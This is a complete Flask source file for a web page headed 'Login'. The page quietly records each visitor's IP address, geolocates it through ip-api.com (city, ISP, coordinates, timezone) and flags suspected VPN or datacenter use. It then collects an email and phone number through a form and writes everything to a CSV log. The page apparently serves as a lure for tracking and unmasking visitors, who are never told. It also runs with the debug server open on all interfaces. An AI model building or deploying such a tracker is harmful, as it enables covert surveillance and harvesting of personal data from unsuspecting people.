from flask import Flask, request, render_template_string
import requests
import datetime
import csv
import os

app = Flask(__name__)

# ---------------------------
# Function to get client IP
# ---------------------------
def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        # Can be multiple IPs, take first one
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    elif request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    else:
        return request.remote_addr

# ---------------------------
# Function to get location info
# ---------------------------
def get_ip_location(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,as,query,org,hosting,proxy,mobile"
        response = requests.get(url, timeout=3)
        data = response.json()

        # Simple VPN/Proxy detection logic
        vpn_detected = False
        reason = []

        # ip-api provides "proxy" and "hosting" fields (sometimes experimental)
        if data.get("proxy"):
            vpn_detected = True
            reason.append("Listed as proxy")

        if data.get("hosting"):
            vpn_detected = True
            reason.append("Hosting provider")

        # Check ISP/ASN keywords
        suspicious_keywords = ["Hosting", "Cloud", "Data Center", "VPS", "Amazon", "Google", "OVH", "DigitalOcean", "Hetzner"]
        isp = data.get("isp", "")
        asn = data.get("as", "")
        if any(kw.lower() in isp.lower() or kw.lower() in asn.lower() for kw in suspicious_keywords):
            vpn_detected = True
            reason.append("Datacenter ASN/ISP")

        return {
            "ip": data.get("query", ip),
            "country": data.get("country", "Unknown"),
            "region": data.get("regionName", "Unknown"),
            "city": data.get("city", "Unknown"),
            "zip": data.get("zip", "Unknown"),
            "lat": data.get("lat", "Unknown"),
            "lon": data.get("lon", "Unknown"),
            "timezone": data.get("timezone", "Unknown"),
            "isp": isp,
            "asn": asn,
            "org": data.get("org", "Unknown"),
            "vpn_suspected": vpn_detected,
            "reason": ", ".join(reason) if reason else "Likely residential"
        }
    except Exception as e:
        return {"ip": ip, "error": str(e)}

# ---------------------------
# Log visitor data to CSV
# ---------------------------
# ---------------------------
# Log visitor data to CSV
# ---------------------------
def log_visitor(data):
    file_exists = os.path.isfile("visitors.csv")
    with open("visitors.csv", mode="a", newline="", encoding="utf-8") as file:
        writer = csv.DictWriter(file, fieldnames=[
            "timestamp", "ip", "country", "region", "city",
            "isp", "vpn", "reason", "email", "phone"
        ])
        if not file_exists:
            writer.writeheader()
        writer.writerow(data)


# ---------------------------
# HTML templates
# ---------------------------
login_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h2>Login Page</h2>
    <form method="POST" action="/submit">
        <label>Email:</label><br>
        <input type="email" name="email" required><br><br>
        <label>Phone Number:</label><br>
        <input type="text" name="phone" required><br><br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
"""

thank_you_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Submitted</title>
</head>
<body>
    <h2>Thank you!</h2>
    <p>Your details have been submitted.</p>
</body>
</html>
"""

# ---------------------------
# Routes
# ---------------------------
@app.route("/")
def index():
    # Log visitor IP on first page visit
    visitor_ip = get_client_ip()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    location = get_ip_location(visitor_ip)

    log_data = {
        "timestamp": timestamp,
        "ip": location.get("ip", visitor_ip),
        "country": location.get("country", "Unknown"),
        "region": location.get("region", "Unknown"),
        "city": location.get("city", "Unknown"),
        "isp": location.get("isp", "Unknown"),
        "vpn" : location.get("vpn_suspected"),
        "reason" : location.get("reason"),
        "email": "N/A",
        "phone": "N/A"
    }
    log_visitor(log_data)
    print(f"[{timestamp}] Visitor Opened Page: {log_data}")

    return render_template_string(login_page)

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email")
    phone = request.form.get("phone")

    visitor_ip = get_client_ip()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    location = get_ip_location(visitor_ip)

    log_data = {
        "timestamp": timestamp,
        "ip": location.get("ip", visitor_ip),
        "country": location.get("country", "Unknown"),
        "region": location.get("region", "Unknown"),
        "city": location.get("city", "Unknown"),
        "isp": location.get("isp", "Unknown"),
        "vpn" : location.get("vpn_suspected"),
        "reason" : location.get("reason"),
        "email": email,
        "phone": phone
    }
    log_visitor(log_data)
    print(f"[{timestamp}] Form Submitted: {log_data}")

    return render_template_string(thank_you_page)

# ---------------------------
# Run Flask
# ---------------------------

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=True)
